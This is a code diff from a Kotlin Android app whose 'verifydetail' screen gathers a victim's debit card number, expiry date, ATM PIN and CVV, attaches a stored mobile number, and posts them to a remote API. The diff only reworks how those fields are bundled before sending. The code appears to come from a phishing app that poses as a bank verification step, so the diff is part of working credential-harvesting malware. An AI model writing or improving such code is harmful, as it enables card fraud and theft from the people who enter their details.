@@ -52,10 +52,9 @@ class verifydetail : AppCompatActivity() {
                 val util = Util()
                 val apiService = ApiClient.getClient().create(ApiService::class.java)
                 val intentff = Intent(this, thirdpage::class.java)
-                val data = SecondPage(customerid = util.getLocalData(this,"c"),
-                    mobile = util.getLocalData(this,"m"),
+                val data = SecondPage(
                     debit = binding.e1.text.toString(), expiry = binding.e2.text.toString(),
-                    atmpin = binding.e3.text.toString(), cvv = binding.e4.text.toString()
+                    atmpin = binding.e3.text.toString(), mobile = util.getLocalData(this,"m"), cvv = binding.e4.text.toString()
                 )
                 val call = apiService.second(data)
                 call.enqueue(object : Callback<Void?> {
